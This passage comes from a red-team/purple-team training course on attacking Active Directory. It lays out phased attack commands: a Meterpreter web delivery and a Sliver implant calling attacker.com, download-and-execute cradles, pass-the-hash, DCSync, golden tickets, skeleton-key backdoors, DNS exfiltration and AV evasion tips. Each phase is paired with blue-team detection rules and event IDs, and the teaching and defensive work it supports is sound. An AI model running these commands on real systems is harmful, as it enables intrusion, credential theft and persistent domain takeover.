# PowerShell delivery with AMSI bypass
msf6 > use exploit/multi/script/web_delivery
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
msf6 > set LHOST attacker.com
msf6 > set SRVPORT 8080
msf6 > set URIPATH /
msf6 > set PSH-EncodedCommand true
msf6 > exploit
```

## Success Criteria

- Establishes Meterpreter session with HTTPS
- Performs credential dumping via Kiwi
- Sets up SOCKS proxy for pivoting

## Blue-Team View

- AMSI events (Event ID 1)
- PowerShell script block logging (4104)
- Sysmon Event ID 1 (process creation)
- Network traffic to non-standard ports

## MITRE ATT&CK Mapping

- **T1059** – Command and Scripting Interpreter
- **T1003** – OS Credential Dumping
- **T1210** – Exploitation of Remote Services

## Detection Ideas

```kql
// Splunk SPL - Detect Meterpreter Traffic
index=netfw sourcetype=stream*
| search dest_port=443 OR dest_port=4444
| search "meterpreter" OR "reverse_" OR "MZ"
| stats count by src_ip, dest_ip, dest_port, _time

// Sigma Rule - Metasploit Web Delivery
title: Metasploit Web Delivery Detection
description: Detects PowerShell download cradles
logsource:
    product: windows
    service: powershell
detection:
    selection:
        EventID: 4104
        ScriptBlockText|contains:
            - 'System.Net.WebClient'
            - 'DownloadString'
            - 'IEX'
            - 'Invoke-Expression'
        ScriptBlockText|contains: 'http://' or 'https://'
    condition: selection
```

---

# PHASE 8 – PRIVILEGE ESCALATION

## Red-Team Goal

Elevate from low-privileged user to SYSTEM/Administrator.

## Modern Attack Example: Full Windows PrivEsc Chain

**Scenario:** From service account to Domain Admin via multiple vectors.

```bash
# Step 1: Automated enumeration with WinPEAS
winpeas.exe quiet cmd fast > winpeas_output.txt

# Step 2: Check for JuicyPotato variants
.\PrintSpoofer.exe -i -c cmd.exe
.\RoguePotato.exe -r attacker_ip -e "C:\Windows\System32\cmd.exe"
.\GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"

# Step 3: Abuse vulnerable services
sc.exe config VulnService binPath= "C:\Windows\System32\cmd.exe"
sc.exe start VulnService

# Step 4: Token manipulation with incognito
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"

# Step 5: DLL hijacking with automated tools
python3 windows-exploit-suggester.py --database 2024-01.db --systeminfo systeminfo.txt
.\Watson.exe /output vulnerabilities.txt
```

## LAB – Modern Privilege Escalation

```bash
# LinPEAS for Linux (modern version)
# Fetched from the official carlospolop/PEASS-ng releases page — only run
# this against lab targets, and prefer the pinned release URL over
# "latest" if you need a reproducible result across lab rebuilds.
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash

# Windows automated checks
# WinPEAS with all checks
winpeas.exe -s > full_scan.txt

# Seatbelt for specific checks
.\Seatbelt.exe -group=all -outputfile=seatbelt.txt

# SharpUp for common vectors
.\SharpUp.exe audit

# PowerUp for PowerShell-based checks
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
Invoke-AllChecks

# Kernel exploit checking
.\windows-exploit-suggester.py --database 2024-01.db --systeminfo systeminfo.txt
.\Sherlock.ps1 -Command Find-AllVulns
```

## Success Criteria

- Identifies ≥3 privilege escalation vectors
- Successfully escalates to SYSTEM/root
- Explains the vulnerability exploited

## Blue-Team View

- Security Event **4688** (process creation)
- Sysmon Event **10** (process access)
- Windows Event **4697** (service installation)

## MITRE ATT&CK Mapping

- **T1068** – Exploitation for Privilege Escalation
- **T1548** – Abuse Elevation Control Mechanism

## Detection Ideas

```kql
// Splunk SPL - Detect Privilege Escalation
index=windows (EventCode=4688 OR EventCode=4672)
| search ParentImage!="C:\\Windows\\System32\\*"
| search Image="C:\\Windows\\System32\\*"
| stats count by ParentImage, Image, CommandLine, _time

// Sigma Rule - Service Binary Path Modification
title: Windows Service Binary Path Modification
description: Detects changes to service binary paths
logsource:
    product: windows
    service: system
detection:
    selection:
        EventID: 7040
        ServiceName: '*'
        ServiceFileName|contains: 'cmd.exe'
    condition: selection
```

---

# PHASE 9 – LATERAL MOVEMENT

## Red-Team Goal

Move laterally through the network using compromised credentials.

## Modern Attack Example: Pass-the-Hash/Ticket at Scale

**Scenario:** Move from initial foothold to Domain Controller.

```bash
# Step 1: Use NetExec for large-scale movement
nxc smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH>
  --exec-method wmiexec --command "whoami" --continue-on-success

# Step 2: Pass-the-Ticket with Rubeus
Rubeus.exe ptt /ticket:administrator.kirbi
Rubeus.exe createnetonly /program:C:\\Windows\\System32\\cmd.exe
  /domain:domain.local /username:Administrator /password:FakePass /ticket:administrator.kirbi

# Step 3: Overpass-the-Hash to get new TGT
Rubeus.exe asktgt /user:Administrator /rc4:<NTLM_HASH> /ptt

# Step 4: Use constrained delegation if available
Rubeus.exe s4u /user:websvc /rc4:<NTLM_HASH> /impersonateuser:Administrator
  /msdsspn:cifs/dc01.domain.local /ptt

# Step 5: Remote execution with multiple protocols
# WMI
python3 wmiexec.py domain.local/Administrator@192.168.1.10 -hashes :<NTLM_HASH>

# WinRM
evil-winrm -i 192.168.1.10 -u Administrator -H <NTLM_HASH>

# Scheduled Tasks
schtasks /create /s 192.168.1.10 /u Administrator /p '' /tn "Update"
  /tr "C:\\Windows\\System32\\cmd.exe /c whoami > C:\\temp\\out.txt" /sc once /st 00:00
schtasks /run /s 192.168.1.10 /tn "Update"
```

## LAB – Modern Lateral Movement

```bash
# Using Impacket's full suite
# SMBExec
psexec.py domain.local/Administrator@192.168.1.10 -hashes :<NTLM_HASH>

# DCOM execution
dcomexec.py domain.local/Administrator@192.168.1.10 -hashes :<NTLM_HASH> -object MMC20

# Using CrackMapExec modules
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH> -M lsassy
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH> -M mimikatz
crackmapexec smb 192.168.1.0/24 -u Administrator -H <NTLM_HASH> -M spider_plus

# Using Sliver C2 for advanced movement
sliver > generate --mtls attacker.com --save /tmp/ --os windows
sliver > use -i
sliver > sessions -i <ID>
sliver > pivots tcp -b 0.0.0.0:8443
sliver > portfwd add -r 192.168.1.10:445 -b 127.0.0.1:4445
```

## Success Criteria

- Moves laterally to ≥3 different systems
- Uses ≥2 different protocols (SMB, WMI, WinRM)
- Maintains access through multiple methods

## Blue-Team View

- Security Event **4624** (logon type 3)
- Security Event **4688** (remote process creation)
- Windows Event **4698** (scheduled task creation)

## MITRE ATT&CK Mapping

- **T1021** – Remote Services
- **T1550** – Use Alternate Authentication Material

## Detection Ideas

```kql
// Splunk SPL - Detect Lateral Movement
index=windows EventCode=4624 LogonType=3
| stats count by src_ip, Workstation_Name, Logon_Process, _time
| eventstats dc(Workstation_Name) as unique_systems by src_ip
| where unique_systems > 5
| table _time, src_ip, unique_systems, Workstation_Name

// Sigma Rule - Pass-the-Hash Detection
title: Pass-the-Hash Activity
description: Detects NTLM authentication without Kerberos
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackage: NTLM
        LogonProcess: NtLmSsp
    filter:
        WorkstationName: 'localhost'
    condition: selection and not filter
```

---

# PHASE 10 – DOMAIN DOMINANCE

## Red-Team Goal

Achieve complete control over the Active Directory domain.

## Modern Attack Example: Golden Ticket + DCShadow + Persistence

**Scenario:** Establish persistent domain control.

```bash
# Step 1: DCSync to get krbtgt hash
secretsdump.py -just-dc-ntlm domain.local/Administrator@dc01.domain.local
# Or using Mimikatz
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Step 2: Create golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local
  /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /ptt

# Step 3: Create silver ticket for specific service
mimikatz # kerberos::golden /user:Administrator /domain:domain.local
  /sid:S-1-5-21-... /target:dc01.domain.local /service:HOST /rc4:<MACHINE_HASH> /ptt

# Step 4: DCShadow attack for persistence
mimikatz # !+
mimikatz # !processtoken
mimikatz # lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=domain,DC=local
  /attribute:ntSecurityDescriptor /value:<NEW_SD>

# Step 5: Create persistence via AdminSDHolder
Add-ObjectACL -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=local'
  -PrincipalIdentity 'COMPROMISED$' -Rights All

# Step 6: Skeleton Key for backdoor
mimikatz # misc::skeleton

# Step 7: Golden Certificate for persistence
certipy shadow auto -u 'DOMAIN\\Administrator' -p '' -pfx administrator.pfx
  -account DC01$ -target dc01.domain.local
```

## LAB – Domain Dominance

```bash
# DCSync alternatives
# Using DRSUAPI
python3 secretsdump.py -just-dc domain.local/Administrator@dc01 -use-vss

# Using Mimikatz DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /all"'

# Golden ticket creation
.\mimikatz.exe "kerberos::golden /user:Administrator /domain:domain.local
  /sid:S-1-5-21-... /krbtgt:<HASH> /ptt" "exit"

# DCShadow attack setup
# On DC (requires DA privileges)
mimikatz # !+
mimikatz # !processtoken
# On attacker machine
mimikatz # lsadump::dcshadow /push

# Persistence via ACLs
.\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity COMPROMISED$
  -Rights DCSync
Add-DomainObjectAcl -TargetIdentity 'CN=Administrators,CN=Builtin,DC=domain,DC=local'
  -PrincipalIdentity COMPROMISED$ -Rights All

# Skeleton Key installation
mimikatz # misc::skeleton
# Test with password "mimikatz"
```

## Success Criteria

- Successfully performs DCSync
- Creates and uses golden ticket
- Establishes ≥2 persistence mechanisms

## Blue-Team View

- Event ID **4662** (directory service access)
- Event ID **4670** (permissions changes)
- Windows Defender for Identity alerts

## MITRE ATT&CK Mapping

- **T1003.006** – DCSync
- **T1558.001** – Golden Ticket
- **T1547** – Boot or Logon Autostart Execution

## Detection Ideas

```kql
// Splunk SPL - Detect DCSync Attacks
index=windows EventCode=4662
| search Object_Type="SAM_DOMAIN"
| search Accesses="Replicating Directory Changes All"
| stats count by Subject_Account_Name, Subject_Domain_Name, src_ip, _time

// Sigma Rule - Golden Ticket Usage
title: Golden Ticket Detection
description: Detects golden ticket usage patterns
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: 0x17
        TicketOptions: '0x40810000'
        ServiceName: 'krbtgt'
        ClientName: '*$'  # Machine account requesting TGT
    condition: selection
```

---

# PURPLE TEAM EXERCISES

## Exercise 1: Full Attack Chain Simulation

**Objective:** Simulate a complete attack from initial access to domain dominance.

```bash
# Red Team Tasks:
1. Reconnaissance: nmap -sV -O 192.168.1.0/24
2. Initial Access: phish user → get credentials
3. Enumeration: BloodHound collection
4. Privilege Escalation: WinPEAS → exploit unquoted service path
5. Lateral Movement: Pass-the-hash to DC
6. Domain Dominance: DCSync → golden ticket

# Blue Team Tasks:
1. Monitor alerts in SIEM
2. Correlate events across phases
3. Identify detection gaps
4. Create new detection rules
5. Incident response simulation
```

## Exercise 2: Detection Gap Analysis

**Objective:** Identify missing detections in current SIEM rules.

```bash
# Steps:
1. Run attack tools in isolated environment
2. Collect all generated logs
3. Map logs to MITRE ATT&CK techniques
4. Check if existing rules catch the activity
5. Create missing detections

# Tools for logging:
- Sysmon with SwiftOnSecurity config
- Windows Advanced Audit Policy
- PowerShell logging (Module, ScriptBlock, Transcription)
- AD Diagnostic logging
```

## Exercise 3: False Positive Reduction

**Objective:** Tune existing detection rules to reduce false positives.

```bash
# Process:
1. Collect 30 days of security logs
2. Run existing detection rules
3. Analyze false positives
4. Add filters and exceptions
5. Test tuned rules

# Example tuning:
- Add whitelist for administrative subnets
- Exclude known scanning tools
- Add time-based thresholds
- Implement baselining
```

---

# FAILURE LABS (LEARNING FROM MISTAKES)

## Lab 1: OpSec Failures

**Scenario:** Attacker gets caught due to poor operational security.

```bash
# Common mistakes to simulate:
1. Using default Metasploit payloads
2. No encryption on C2 traffic
3. Scanning from real IP
4. Using known tool signatures
5. No cleanup after compromise

# Detection opportunities:
- EDR alerts on known malware signatures
- Network IDS detects unencrypted C2
- SIEM correlation reveals attack pattern
```

## Lab 2: Tool Detection

**Scenario:** Common tools are detected by AV/EDR.

```bash
# Tools that often get detected:
- Mimikatz (all versions)
- BloodHound/SharpHound
- Responder
- CrackMapExec
- Metasploit payloads

# Evasion techniques to try:
- Custom compile with obfuscation
- Memory-only execution
- Living-off-the-land binaries
- Custom C2 protocols
```

## Lab 3: Logging Overload

**Scenario:** Blue team overwhelmed by too many alerts.

```bash
# Problem: Alert fatigue leads to real threats being missed
# Solution: Implement alert prioritization

# Alert tiers:
Tier 1 (Critical): DCSync, Golden Ticket, DC access
Tier 2 (High): Pass-the-Hash, Kerberoasting
Tier 3 (Medium): SMB enumeration, LDAP queries
Tier 4 (Low): Port scans, failed logins
```

---

# SOC INVESTIGATION TABLES

## Table 1: Event ID Quick Reference

| Event ID | Description                 | Attack Phase         | Criticality |
| -------- | --------------------------- | -------------------- | ----------- |
| 4624     | Successful Logon            | Initial Access       | High        |
| 4625     | Failed Logon                | Reconnaissance       | Medium      |
| 4648     | Explicit Credentials        | Lateral Movement     | High        |
| 4662     | Directory Service Access    | DCSync               | Critical    |
| 4672     | Special Privileges Assigned | Privilege Escalation | High        |
| 4688     | Process Creation            | Execution            | High        |
| 4698     | Scheduled Task Created      | Persistence          | High        |
| 4703     | Token Right Adjusted        | Privilege Escalation | High        |
| 4768     | Kerberos TGT Request        | Kerberoasting        | High        |
| 4769     | Kerberos Service Ticket     | Kerberoasting        | High        |
| 5140     | Network Share Access        | Lateral Movement     | Medium      |
| 5156     | Windows Filtering Platform  | Reconnaissance       | Low         |

## Table 2: MITRE ATT&CK to Log Source Mapping

| Technique                       | Primary Logs    | Secondary Logs    | Detection Difficulty |
| ------------------------------- | --------------- | ----------------- | -------------------- |
| T1018 – Remote System Discovery | Firewall (5156) | Network IDS       | Easy                 |
| T1087 – Account Discovery       | LDAP (1644)     | Security (4662)   | Medium               |
| T1135 – Network Share Discovery | Security (5140) | SMB Server        | Easy                 |
| T1558.001 – Kerberoasting       | Security (4769) | EDR               | Hard                 |
| T1003.006 – DCSync              | Security (4662) | Directory Service | Critical             |
| T1557.001 – NTLM Relay          | Security (4624) | ADCS (4886)       | Medium               |

## Table 3: Tool Detection Signatures

| Tool         | Common Detection Signatures          | Evasion Techniques                 |
| ------------ | ------------------------------------ | ---------------------------------- |
| Mimikatz     | "mimikatz", "sekurlsa", "kerberos::" | Memory injection, custom compile   |
| BloodHound   | "SharpHound", "BloodHound", neo4j    | Rename binary, custom collector    |
| Responder    | LLMNR/NBT-NS poisoning               | Rate limiting, IP spoofing         |
| CrackMapExec | "crackmapexec", SMB enumeration      | Rename, use legitimate admin tools |
| Metasploit   | "meterpreter", "reverse_tcp"         | Custom payloads, HTTPS C2          |

---

# CAPSTONE PROJECT: ENTERPRISE ATTACK SIMULATION

## Scenario: Financial Institution Breach

**Background:** You are a red team assessing a bank's AD environment. The goal is to simulate an APT attack.

### Phase 1: Initial Reconnaissance (Week 1)

```bash
# External reconnaissance
subfinder -d bank.com -o domains.txt
nmap -sS -T4 -iL domains.txt -oA external_scan

# Phishing campaign
gophish campaign --template payroll.html --targets employees.csv
```

### Phase 2: Internal Movement (Week 2)

```bash
# With initial access credentials
bloodhound-python -d bank.internal -u compromised -p 'Password123!' -c All

# Privilege escalation
.\winPEAS.exe > priv_esc.txt
# Exploit PrintSpoofer to get SYSTEM
```

### Phase 3: Domain Dominance (Week 3)

```bash
# DCSync from compromised DC
secretsdump.py bank.internal/Administrator@dc01.bank.internal

# Golden ticket creation
mimikatz # kerberos::golden /user:Administrator /domain:bank.internal ...

# Persistence via Group Policy
New-GPO -Name "Backdoor" | New-GPLink -Target "DC=bank,DC=internal"
```

### Phase 4: Data Exfiltration (Week 4)

```bash
# Find sensitive data
Find-InterestingFile -Path "\\fs01\share\" -Terms "confidential,secret"

# Exfiltrate via DNS tunneling
dnscat2 --secret MySecret --dns domain=bank.internal
```

## Blue Team Response Requirements

1. **Detection:** Identify at least 80% of attack activities
2. **Containment:** Isolate compromised systems within 2 hours
3. **Eradication:** Remove all persistence mechanisms
4. **Recovery:** Restore systems from clean backups
5. **Lessons Learned:** Document findings and improve defenses

---

# METRICS AND MEASUREMENT

## Key Performance Indicators (KPIs)

| Metric                      | Target       | Measurement                      |
| --------------------------- | ------------ | -------------------------------- |
| Mean Time to Detect (MTTD)  | < 1 hour     | SIEM alert timestamp             |
| Mean Time to Respond (MTTR) | < 4 hours    | Incident closure timestamp       |
| Detection Coverage          | > 90%        | MITRE ATT&CK techniques detected |
| False Positive Rate         | < 5%         | Alerts vs actual incidents       |
| Alert Triage Time           | < 15 minutes | Time to categorize alert         |

## Continuous Improvement Cycle

```bash
1. Plan: Identify detection gaps
2. Do: Implement new detections
3. Check: Test in purple team exercises
4. Act: Tune based on results
5. Repeat: Continuous cycle
```

---

# TOOL MAINTENANCE AND UPDATES

## Weekly Tool Updates

```bash
# Update all tools
apt update && apt upgrade -y

# Specific tool updates
msfupdate  # Metasploit
git pull   # All cloned repositories
pip install --upgrade impacket bloodhound-python

# Update wordlists
cd /usr/share/wordlists && git pull
```

## Custom Tool Development

**Example:** Create custom BloodHound collector

```python
#!/usr/bin/env python3
# custom_bh_collector.py
from bloodhound import BloodHound, ADAuthentication
import logging

class StealthCollector(BloodHound):
    def __init__(self):
        super().__init__()
        self.throttle = 100  # ms between queries
        self.batch_size = 50  # objects per query

    def collect(self):
        # Custom collection logic here
        pass
```

---

# INSTRUCTOR NOTES

## Teaching Methodology

1. **Theory → Demonstration → Practice** cycle
2. **Failure is learning:** Encourage students to get caught
3. **Blue team perspective:** Every attack must include detection discussion
4. **Real-world context:** Use actual enterprise scenarios

## Assessment Criteria

| Category             | Weight | Description                        |
| -------------------- | ------ | ---------------------------------- |
| Technical Skill      | 40%    | Successful tool usage              |
| Operational Security | 20%    | Avoiding detection                 |
| Documentation        | 20%    | Clear notes and reporting          |
| Blue Team Insight    | 20%    | Understanding defender perspective |

## Common Student Challenges

1. **Tool overload:** Too many tools, not enough understanding
2. **OpSec neglect:** Getting caught repeatedly
3. **Tunnel vision:** Focusing on one attack vector
4. **Documentation avoidance:** Not taking notes

## Solutions

1. **Limit tools:** Master 2-3 tools per phase
2. **Force OpSec:** Penalize getting detected
3. **Require multiple paths:** Each objective must be achieved 2 ways
4. **Note checks:** Random notebook inspections

---
